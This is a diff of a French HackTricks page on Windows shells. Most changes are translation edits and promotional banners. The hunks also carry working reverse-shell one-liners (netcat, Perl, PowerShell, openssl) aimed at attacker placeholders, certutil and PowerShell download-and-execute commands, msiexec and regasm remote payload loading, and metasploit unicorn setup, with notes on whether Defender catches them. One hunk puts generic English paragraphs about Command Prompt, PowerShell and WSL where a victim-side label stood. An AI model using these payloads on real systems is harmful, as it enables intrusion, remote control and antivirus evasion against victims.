@@ -1,18 +1,19 @@
 # Shells - Windows
 
+{% hint style="success" %}
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Soutenez HackTricks</summary>
 
-Autres façons de soutenir HackTricks:
-
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
+{% endhint %}
 
 **Groupe de sécurité Try Hard**
 
@@ -24,8 +25,8 @@ Autres façons de soutenir HackTricks:
 
 ## Lolbas
 
-La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows comme [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour Linux.\
-Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo dans Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être utilisés pour effectuer des actions inattendues telles que **exécuter du code arbitraire.**
+La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows comme [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour linux.\
+Évidemment, **il n'y a pas de fichiers SUID ou de privilèges sudo dans Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être utilisés pour effectuer des actions inattendues comme **exécuter du code arbitraire.**
 
 ## NC
 ```bash
@@ -33,7 +34,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) est une alternative portable et sécurisée à Netcat**. Il fonctionne sur les systèmes de type Unix et Win32. Avec des fonctionnalités telles que le chiffrement fort, l'exécution de programmes, des ports source personnalisables et une reconnexion continue, sbd offre une solution polyvalente pour la communication TCP/IP. Pour les utilisateurs de Windows, la version sbd.exe de la distribution Kali Linux peut être utilisée comme un remplacement fiable de Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) est une alternative portable et sécurisée à Netcat**. Il fonctionne sur les systèmes de type Unix et Win32. Avec des fonctionnalités telles qu'un cryptage fort, l'exécution de programmes, des ports source personnalisables et une reconnexion continue, sbd offre une solution polyvalente pour la communication TCP/IP. Pour les utilisateurs de Windows, la version sbd.exe de la distribution Kali Linux peut être utilisée comme un remplacement fiable de Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -52,7 +53,7 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl est un langage de script polyvalent et puissant qui est souvent utilisé pour écrire des scripts d'automatisation et des outils de manipulation de données. Perl est disponible sur la plupart des systèmes d'exploitation Windows par défaut, ce qui en fait un choix populaire pour les hackers et les professionnels de la sécurité.
+Perl is a high-level, general-purpose, interpreted programming language known for its flexibility and powerful text processing capabilities. Perl can be used for various tasks, including system administration, web development, and network programming. Perl scripts can be run on Windows using the ActivePerl distribution or by installing Perl from source.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -74,7 +75,19 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Victime
+### Windows Shells
+
+#### Command Prompt
+
+The Command Prompt is a built-in Windows shell that allows users to interact with the system through text commands. It is a powerful tool for executing various commands and scripts.
+
+#### PowerShell
+
+PowerShell is another powerful shell provided by Windows, offering more advanced features compared to the Command Prompt. It allows for task automation and configuration management through scripting.
+
+#### Windows Subsystem for Linux (WSL)
+
+WSL allows running a Linux distribution natively on Windows, providing access to Linux tools and utilities directly from the Windows shell. This can be useful for developers and system administrators who require Linux functionality on a Windows system.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -94,10 +107,10 @@ Charge utile écrite sur le disque : **NON** (_du moins nulle part que j'ai pu t
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Processus effectuant un appel réseau: **svchost.exe**\
-Charge utile écrite sur le disque: **cache local du client WebDAV**
+Processus effectuant un appel réseau : **svchost.exe**\
+Charge utile écrite sur le disque : **cache local du client WebDAV**
 
-**Une ligne:**
+**En une ligne :**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -274,7 +287,7 @@ Téléchargez un B64exe, décodez-le et exécutez-le.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Détecté par le défenseur**
+**Détecté par Defender**
 
 
 ## **Cscript/Wscript**
@@ -301,7 +314,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Détecté par le défenseur**
+**Détecté par Defender**
 
 ## **MSIExec**
 
@@ -322,7 +335,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Exemple de fichier xsl [ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Fichier xsl d'exemple [à partir d'ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -357,13 +370,13 @@ Compiler le code C# sur la machine de la victime.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Vous pouvez télécharger un shell inversé C# de base à partir d'ici: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Vous pouvez télécharger un shell inversé C# de base à partir d'ici : [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Non détecté**
 
 ## **Regasm/Regsvc**
 
-* [À partir d'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [D'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
@@ -387,7 +400,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Dans le dossier **Shells**, il y a beaucoup de shells différents. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier:
+Dans le dossier **Shells**, il y a beaucoup de coquilles différentes. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_ faire une copie du script et ajouter à la fin du fichier:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -397,7 +410,7 @@ powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).
 
-**TODO: Vérifier les autres shells de nishang**
+**TODO: Vérifier les autres shells nishang**
 
 ### **PS-Powercat**
 
@@ -436,7 +449,7 @@ Créez un lanceur powershell, enregistrez-le dans un fichier et téléchargez-le
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Code détecté comme malveillant**
+**Détecté comme code malveillant**
 
 ### MSF-Unicorn
 
@@ -446,15 +459,15 @@ Créez une version powershell de la porte dérobée metasploit en utilisant unic
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Lancez msfconsole avec la ressource créée :
+Commencez msfconsole avec la ressource créée :
 ```
 msfconsole -r unicorn.rc
 ```
-Commencez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez dans la victime:
+Commencez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez sur la victime:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Code détecté comme malveillant**
+**Détecté comme code malveillant**
 
 ## Plus
 
@@ -472,22 +485,23 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modul
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
-**Try Hard Security Group**
+**Groupe de sécurité Try Hard**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Soutenez HackTricks</summary>
 
-Autres façons de soutenir HackTricks:
-
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
+{% endhint %}
